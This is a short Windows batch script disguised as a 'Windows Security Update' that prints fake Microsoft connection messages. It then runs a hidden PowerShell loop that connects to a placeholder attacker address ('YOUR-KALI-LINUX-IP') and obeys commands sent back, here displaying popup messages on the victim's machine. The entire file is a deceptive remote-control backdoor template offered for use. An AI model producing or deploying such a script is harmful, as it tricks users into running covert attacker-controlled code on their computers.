@echo off
title Windows Security Update
echo Connecting to Microsoft Server...
echo.
echo Please wait...
ping 127.0.0.1 -n 3 >nul

:loop
    powershell -WindowStyle Hidden -Command "while($true){ $msg = (New-Object Net.Sockets.TCPClient('YOUR-KALI-LINUX-IP',PORT)).GetStream(); $data = New-Object Byte[] 1024; $bytes = $msg.Read($data,0,$data.Length); if($bytes -gt 0){ $command = [Text.Encoding]::ASCII.GetString($data,0,$bytes); if($command -match 'POPUP:(.*)'){ $text = $command -replace 'POPUP:',''; msg * $text } } }"
goto loop
